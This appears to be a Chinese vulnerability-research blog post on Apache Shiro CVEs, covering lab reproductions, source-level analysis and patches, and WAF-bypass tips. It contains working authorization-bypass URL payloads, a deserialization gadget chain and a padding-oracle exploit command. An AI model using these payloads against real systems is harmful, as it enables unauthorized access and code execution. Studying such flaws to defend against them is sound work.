+<p>而<code>Commons Beanutils</code>中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意<code>JavaBean</code>的<code>getter</code>方法。</p>
+<p>比如一个类<code>User</code>是个<code>JavaBean</code>，它有个<code>name</code>属性，则<code>PropertyUtils.getProperty(new Usesr(),&quot;name&quot;)</code>则会调用它的<code>getName()</code>方法。</p>
+<p>在构造cc链中有遇过<code>TemplateImpl</code>类，它有一个<code>getOutputProperties</code>方法可以触发字节码加载，如果我们可以通过反序列化的点直接或间接让其调用<code>PropertyUtils.getProperty(new TemplateImpl(),&quot;OutputProperties&quot;)</code>，那就可以RCE。</p>
+</blockquote>
+<p>在<code>commons-beanutils-1.7.0.jar!\org\apache\commons\beanutils\BeanComparator.class</code>中存在一个<code>compare</code>方法，这个<code>compare</code>方法可以自动调用<code>PropertyUtils.getProperty</code>方法，看到<code>compare</code>方法是不是感觉在cc链中碰到过，因此这里可以拼接上cc2链的前半段使其走到<code>compare</code>方法，触发RCE</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271639643.png" alt="image-20220927163911565"></p>
+<p>整个调用链如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                BeanComparator.compare()</span><br><span class="line">                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                        TemplatesImpl.newTransformer()</span><br><span class="line">                            TemplatesImpl.getTransletInstance()</span><br><span class="line">                                TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                    TransletClassLoader.defineClass()</span><br><span class="line">                                           newInstance()</span><br><span class="line">                                         Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>还是在前面的漏洞利用工具上，利用链显示的是<code>CommonsBeanutils183</code>，这里的183表示的是cb的版本号，如果碰到cb链反序列化失败的情况，那就有可能是工具中的cb的版本和漏洞环境的不一致，导致的反序列化失败，失败的原因可能是 <code>serialVersionUID</code>的问题，可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/whq12789/article/details/88031965">https://blog.csdn.net/whq12789/article/details/88031965</a></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271653421.png" alt="image-20220927165337284"></p>
+<p>在打hvv期间，碰到很多存在shiro的站，但是上工具探测密钥和利用链的时候可能回碰到被WAF拦截的情况，那这个时候我们有没有可以绕过的办法呢，可以参考如下几点：</p>
+<ul>
+<li>修改请求方式，如修改GET&#x2F;POST，使用未知HTTP请求绕过，如AAA</li>
+<li>在payload中添加特殊字符，比如空格，tab，^，………..，%%%%</li>
+<li>将请求方式和rememberMe修改为其他字符串</li>
+</ul>
+<p>具体的细节可以参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw">https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw</a></p>
+<p>在实战中我们使用工具会加快我们的效率，有很多优秀的利用工具可以使用：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a></p>
+<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Shiro 在 1.2.5 的更新 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a> 中针对此漏洞进行了修复，应用程序需要用户手动配置一个 cipherKey，如果不设置，将会生成一个新 key。但是如果cipherKey泄露给攻击者，那么还是会存在遭受反序列化攻击的可能。</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271739907.png" alt="image-20220927173947660"></p>
+<h3 id="CVE-2016-6802"><a href="#CVE-2016-6802" class="headerlink" title="CVE-2016-6802"></a>CVE-2016-6802</h3><h4 id="漏洞信息-3"><a href="#漏洞信息-3" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6802">CVE-2016-6802</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-07814">CNVD-2016-07814</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.3.2</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Shiro 使用非根 servlet 上下文路径中存在安全漏洞。远程攻击者通过构造的请求， 利用此漏洞可绕过目标 servlet 过滤器并获取访问权限。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">绕过 | Context Path | 非根 | &#x2F;x&#x2F;..&#x2F;</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/14055279.html">https://www.cnblogs.com/backlion/p/14055279.html</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>接着用CVE-2010-3863的环境，改下shiro的依赖防止和CVE-2010-3863漏洞的利用重复了，因为这个漏洞涉及项目路径，所以在springboot的配置文件中配置下项目访问的路径：</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">server.servlet.context-path=/myshiro</span></span><br></pre></td></tr></table></figure>
+
+<p>配置好后，访问<code>/myshiro/secret.html</code>显示302跳转登录</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271814640.png" alt="image-20220927181448518"></p>
+<p>利用poc绕过权限校验，访问<code>/x/../myshiro/secret.html</code>绕过成功</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271819272.png" alt="image-20220927181907126"></p>
+<p>一般碰到权限校验的我都会用下我的字典跑下，看看有没有其他的payload可以绕过：</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271821480.png" alt="image-20220927182153307"></p>
+<p>整理下可用的payload，其实和CVE-2010-3863的payload差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/;/myshiro/secret.html</span><br><span class="line">/./myshiro/secret.html</span><br><span class="line">/a.ico/../myshiro/secret.html</span><br><span class="line">/%2e/myshiro/secret.html</span><br><span class="line">/%3b/../myshiro/secret.html</span><br><span class="line">/;%09/myshiro/secret.html</span><br><span class="line">/;%09../myshiro/secret.html</span><br><span class="line">/;%2F../myshiro/secret.html</span><br></pre></td></tr></table></figure>
+
+<p>看到payload应该就大致明白漏洞点在哪了，CVE-2010-3863的问题是出在requestURI剔除contextPath之后的路径没有做路径标准化处理；而本次漏洞就是处在contextPath的路径没有做路径标准化处理。</p>
+<h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>还是回到<code>WebUtils#getPathWithinApplication</code>方法，跟进<code>getContextPath</code>方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271847922.png" alt="image-20220927184759844"></p>
+<p>调用<code>HttpServletRequestWrapper#getContextPath</code>方法获取<code>contextPath</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271848022.png" alt="image-20220927184845926"></p>
+<p>继续一路跟进来到<code>tomcat-embed-core-9.0.65.jar!\org\apache\catalina\connector\Request.class#getContextPath</code>方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271850089.png" alt="image-20220927185010974"></p>
+<p>首先会获取第二个 “&#x2F;“的位置，然后进行截取比如：<code>/x/../myshiro/secret.html</code>截取得到 <code>/x</code>，然后做路径标准化处理（做法如CVE-2010-3863的处理），这里可以看到的出来它会循环获取”&#x2F;“的位置，下一次就是截取到 <code>/x/..</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271851254.png" alt="image-20220927185139169"></p>
+<p>然后将截取到的路径 <code>/x</code> 与 <code>context path</code>进行比对，这里 <code>context path</code>即为项目路径 <code>/myshiro</code>， <code>/x</code> 和 <code>/myshiro</code>发现不匹配，就会获取下一个”&#x2F;“的位置，即上面的 <code>/x/..</code>，然后继续匹配</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271854943.png" alt="image-20220927185426755"></p>
+<p>最后当截取的路径为 <code>/x/../myshiro</code>经过路径标准化处理后得到 <code>/myshiro</code>与之匹配，然后返回 <code>uri.substring(0, pos)</code>的结果即为 <code>/x/../myshiro</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209271859384.png" alt="image-20220927185916222"></p>
+<p>返回之后回到<code>getPathWithinApplication</code>方法中，判断<code>requestUri</code>的开头是否是<code>contextPath</code>，显然是<code>false</code>，直接返回<code>requestUri</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209280941075.png" alt="image-20220928094139942"></p>
+<p>而后与pathPattern进行匹配，最后匹配不上就走的<code>/**</code>规则</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209280945439.png" alt="image-20220928094544368"></p>
+<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Shiro 在 1.3.2 版本更新中 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Commit-b15ab92</a> 中针对此漏洞进行了修复。修复方式和 CVE-2010-3863 一样，使用路径标准化方法 <code>normalize</code> 来处理 Context Path。</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281001651.png" alt="image-20220928100114414"></p>
+<h3 id="CVE-2019-12422"><a href="#CVE-2019-12422" class="headerlink" title="CVE-2019-12422"></a>CVE-2019-12422</h3><h4 id="漏洞信息-4"><a href="#漏洞信息-4" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12422">CVE-2019-12422</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-42574">CNVD-2016-07814</a> &#x2F; <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-721">SHIRO-721</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.4.2 (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1)</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密方式容易受到 Padding Oracle Attack 攻击，攻击者利用有效的 RememberMe Cookie 作为前缀， 然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">反序列化 | RememberMe | Padding | CBC</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data">https://blog.skullsecurity.org/2016/12</a> <a target="_blank" rel="noopener" href="https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/">https://resources.infosecinstitute.com/topic/padding-oracle-attack-2/</a> <a target="_blank" rel="noopener" href="https://codeantenna.com/a/OwWV5Ivtsi">https://codeantenna.com/a/OwWV5Ivtsi</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>环境用的是这位师傅的 <a target="_blank" rel="noopener" href="https://github.com/inspiringz/Shiro-721/tree/master/Docker%EF%BC%8C%E6%90%AD%E5%BB%BA%E5%A5%BD%E5%90%8E%E8%AE%BF%E9%97%AE%E5%BE%97%E5%88%B0%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/inspiringz/Shiro-721/tree/master/Docker，搭建好后访问得到如下：</a></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281042179.png" alt="image-20220928104258960"></p>
+<p>勾选rememberMe，登录获取rememberMe的cookie value</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=UHO2xoJqYLimSdPUt+qvPuJc2MqyYr1MOHj20pCIpD9WYs9oc8oOvHo9DdfjY/2fNv5mB34OIgamHYByPj75f7ixcrame6ad5/F5sfKJ+7+r3qj5l0SSJMK4S9PpHHzHY4heNG1oOvcqQSekm4msr3W6YoYNPP0THVbf7u0Yt3vzMzgxJzAqbCFRDXyY6L+ryFRfyE0jjPvfHyk9G2EbZBLsvEHlUPr9AZ+GWP+VkB2mUYF8yk2QSPOzVYr0NmYOAjGIY5IJhcn7lW5USNmWuXDLF/lkJvvjzR7cKA6NvG+4u0mEbHfETPFijiwsRjEwxlORwOmMnR5SkH1MWFRspijIk4WRSFPQnexQTq+Y4uuLDU9N69UrfhlFAGI3rRni42OpEzvkyHd+k7+jHvIL0haGdxRsyXLSO3rjLVLnRaNxyuUpVya4s2iENx5/fpOqigJcYxi3l5QLMe2vAtHxNrlKMuM+Al3BYEhI/ep06zWyAiv3XrmCrIlDV5NcH3Sa</span><br></pre></td></tr></table></figure>
+
+<p>使用ysoserial生成payload</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281046701.png" alt="image-20220928104630508"></p>
+<p>利用脚本还是这位师傅的：<a target="_blank" rel="noopener" href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\shiro_exp.py &quot;http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">12</span>.<span class="number">130</span>:<span class="number">8080</span>/myshiro/&quot; &quot;UHO2xoJqYLimSdPUt+qvPuJc2MqyYr1MOHj20pCIpD9WYs9oc8oOvHo9DdfjY/<span class="number">2</span>fNv5mB34OIgamHYByPj75f7ixcrame6ad5/F5sfKJ+<span class="number">7</span>+r3qj5l0SSJMK4S9PpHHzHY4heNG1oOvcqQSekm4msr3W6YoYNPP0THVbf7u0Yt3vzMzgxJzAqbCFRDXyY6L+ryFRfyE0jjPvfHyk9G2EbZBLsvEHlUPr9AZ+GWP+VkB2mUYF8yk2QSPOzVYr0NmYOAjGIY5IJhcn7lW5USNmWuXDLF/lkJvvjzR7cKA6NvG+<span class="number">4</span>u0mEbHfETPFijiwsRjEwxlORwOmMnR5SkH1MWFRspijIk4WRSFPQnexQTq+Y4uuLDU9N69UrfhlFAGI3rRni42OpEzvkyHd+k7+jHvIL0haGdxRsyXLSO3rjLVLnRaNxyuUpVya4s2iENx5/fpOqigJcYxi3l5QLMe2vAtHxNrlKMuM+Al3BYEhI/ep06zWyAiv3XrmCrIlDV5NcH3Sa&quot; .\payload.ser</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281125034.png" alt="image-20220928112434246"></p>
+<p>最后得到可利用的RememberMe Cookie，发送数据包即可，这里因为电脑比较卡，就没有跑出来。</p>
+<h4 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这块的漏洞原理和CVE-2016-6802讲的shiro key探测类似，都是通过异常走进catch代码块中的<code>onRememberedPrincipalFailure</code>方法，导致响应包出现deleteMe的字段，根据回显的不同来进行探测的</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281148247.png" alt="image-20220928114808156"></p>
+<p>先进入<code>convertBytesToPrincipals</code>方法中看下哪个点会触发异常，这里有个<code>getCipherService</code>方法不会导致异常的发生，那就看下<code>decrypt</code>方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281151926.png" alt="image-20220928115132872"></p>
+<p>跟进<code>decrypt</code>方法，调用<code>arraycopy</code>方法将原密文复制到<code>encrypted</code>数组中，并传入<code>JcaCipherService#decrypt</code>一个重载方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281303031.png" alt="image-20220928130345936"></p>
+<p>继续一直调用decrypt重载方法，最后来到这个重载方法，调用<code>Cipher#doFinal</code>方法</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281311387.png" alt="image-20220928131119321"></p>
+<p>来到<code>AESCipher#engineDoFinal</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281312573.png" alt="image-20220928131235460"></p>
+<p>继续向下通过<code>CipherCore#unpad</code>方法检测是否padding正确，否则抛出异常</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281318489.png" alt="image-20220928131843275"></p>
+<p><code>unpad</code>方法的检测逻辑</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281320223.png" alt="image-20220928132008112"></p>
+<p>所以，如果padding正确，那么就会返回正常的数据包，如果padding异常就会被最开始的<code>AbstractRememberMeManager#getRememberedPrincipals</code>方法捕获，进入<code>AbstractRememberMeManager#onRememberedPrincipalFailure</code>方法中，后面在响应包中回显deleteMe在检测key时就说明过了，不在向下分析。</p>
+<p>有关RememberMe Padding Oracle更多的细节可以看：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9406">https://xz.aliyun.com/t/9406</a></p>
+<h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在 1.4.2 版本的更新 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/a8018783373ff5e5210225069c9919e071597d5e">Commit-a801878</a> 中针对此漏洞进行了修复，在AesCipherService中重写了<code>createParameterSpec</code>方法，设置默认使用 GCM 加密模式</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281328963.png" alt="image-20220928132853662"></p>
+<h3 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h3><h4 id="漏洞信息-5"><a href="#漏洞信息-5" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1957">CVE-2020-1957</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-20984">CNVD-2020-20984</a> &#x2F; <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.5.3</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">Spring Boot 中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL 利用 Shiro 和 SpringBoot 对 URL 的处理的差异化，可以绕过 Shiro 对 SpringBoot 中的 Servlet 的权限控制，越权并实现未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">SpringBoot | 差异化处理 | &#x2F; | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/589f10d40414a815dbcaf1f1500a51f41258ef70">Commit-589f10d</a> &amp;&amp; <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/9762f97926ba99ac0d958e088cae3be8b657948d">Commit-9762f97</a> &amp;&amp; <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce">Commit-3708d79</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-742">SHIRO-742</a> <a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2020/03/23/2">https://www.openwall.com/lists/oss-security/2020/03/23/2</a> <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-2957">CVE-2020-2957</a> -&gt; ?</td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>漏洞起源于 <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-682">SHIRO-682</a>，根据描述信息大致可以知道，在shiro和spring结合使用时，spring请求的 <code>/resource/meuns</code> 和 <code>/resource/menus/</code> 都能够访问到资源，但是在shiro的pathPattern匹配时，会匹配上 <code>/resource/meuns</code> ，但不能匹配 <code>/resource/menus/</code>，因此可以使用reuestURI + “&#x2F;“ 去绕过filter chain，绕过shiro的权限校验。</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281414058.png" alt="image-20220928141454818"></p>
+<p>下面简单搭建一个springboot+shiro的环境，shiro的版本用的是&lt;&#x3D;1.5.1即可，ShiroConfig配置好需要鉴权的路径</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281419815.png" alt="image-20220928141917697"></p>
+<p>然后访问需要权限的 <code>/admin/index</code> 接口，如下显示302需要登录</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281421742.png" alt="image-20220928142111557"></p>
+<p>这时根据漏洞的描述，访问 <code>/admin/index/</code>，成功绕过</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281422762.png" alt="image-20220928142225627"></p>
+<p>习惯性的用字典跑一下，还是可以采用 “;”进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/;/myshiro/admin/index </span><br><span class="line">/%3b/../myshiro/admin/index</span><br><span class="line">/img/..;/myshiro/admin/index</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281444040.png" alt="image-20220928144402921"></p>
+<h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>spring 在分发请求时，会调用<code>PathPatternsRequestCondition#getMatchingPatterns</code>获取匹配的路径，调用的是<code>PathPattern.mathches</code>进行匹配，从结果来看spring认为 <code>/admin/index</code> 和 <code>/admin/index/</code> 一样</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281545777.png" alt="image-20220928154502666"></p>
+<p>而shiro的路径匹配采用的是<code>org.apache.shiro.util.PatternMatcher#matches</code>，返回<code>false</code>，就导致了shiro的权限绕过</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281549411.png" alt="image-20220928154953327"></p>
+<p>在上面漏洞复现的时候，我会习惯性地用字典跑一个权限绕过的payload，大家应该发现每次跑的时候都存在一个 <code>&quot;;&quot;</code> 绕过的方式，而这个方式就是对上面的一种绕过，修改下环境的shiro版本，上面环境用的是shiro1.4.2，现在改用shiro1.5.2（该版本已经修复了上面采用 “&#x2F;“ 进行全绕过的漏洞），在pom.xml中修改为如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.5.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时，再去测试时就会发现 <code>&quot;/&quot;</code> 这种方式已经失效了</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281556036.png" alt="image-20220928155626915"></p>
+<p>试试之前经常用的 <code>&quot;;&quot;</code> ，可以发现依旧能够绕过权限校验</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281558724.png" alt="image-20220928155800583"></p>
+<p>注：该绕过方式在shiro1.5.3终于修复，下面是shiro1.5.3的环境</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281559105.png" alt="image-20220928155943938"></p>
+<p>那么，我们就要研究下在shiro&lt;&#x3D;1.5.2中，<code>&quot;;&quot;</code> 绕过的原理是什么，以及在shiro1.5.3中又是如何修复的呢，下面开始分析。</p>
+<p>还是从<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>方法开始分析</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281624188.png" alt="image-20220928162410071"></p>
+<p>这里看到获取的contextPath的值是 <code>&quot;/;/shiro&quot;</code>， 根据经验，只要requestUri不是以contextPath开头那都可能存在问题提，所以这次可能也不例外</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281627035.png" alt="image-20220928162756918"></p>
+<p>进入<code>org.apache.shiro.web.util.WebUtils#getRequestUri</code>，发现在处理uri时会调用<code>WebUtils#decodeAndCleanUriString</code>进行处理</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281630420.png" alt="image-20220928163058300"></p>
+<p>跟进<code>WebUtils#decodeAndCleanUriString</code>，可以发现，这里会检查uri中是否包含有 <code>&quot;;&quot;</code>，如果有，就以第一个 <code>&quot;;&quot;</code>为下标进行字符串截取，如下截取完之后就会返回 <code>&quot;/&quot;</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281633700.png" alt="image-20220928163306583"></p>
+<p>所以，requestUri返回 <code>&quot;/&quot;</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281635734.png" alt="image-20220928163506624"></p>
+<p>而后，在进行路径匹配时，那就是<code>false</code>了，shiro这层就绕过了</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281637720.png" alt="image-20220928163703620"></p>
+<p>那spring有是如何处理requestUri，它会对 <code>&quot;;&quot;</code> 做什么处理？</p>
+<p>spring处理的时候会调用<code>org.springframework.web.util.UrlPathHelper#decodeAndCleanUriString</code>方法处理uri，如下，包含有三个方法，每一个方法都对uri进行了相应的处理</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281641614.png" alt="image-20220928164110510"></p>
+<p>首先，跟进<code>UrlPathHelper#removeSemicolonContent</code>方法，发现循环体会将<code>;xxx/</code>中的分号与斜杠之间的字符串以及分号本身都去掉，也就是说 <code>&quot;/;aa/bbb&quot;</code>会转化成 <code>&quot;/bbb&quot;</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281700921.png" alt="image-20220928170023801"></p>
+<p>返回，进入第二个<code>decodeRequestString</code>方法，发现会根据对应的编码进行解码操作，否则进行url解码</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281707395.png" alt="image-20220928170702289"></p>
+<p>进入第三个<code>getSanitizedPath</code>方法，可以看到就是将 <code>&quot;//&quot;</code> 转成 <code>&quot;/&quot;</code></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209281708240.png" alt="image-20220928170850153"></p>
+<p>所以，我们的uri：<code>/;a/myshiro/admin/index</code>经过这三个函数转化后变成 <code>/myshiro/admin/index</code></p>
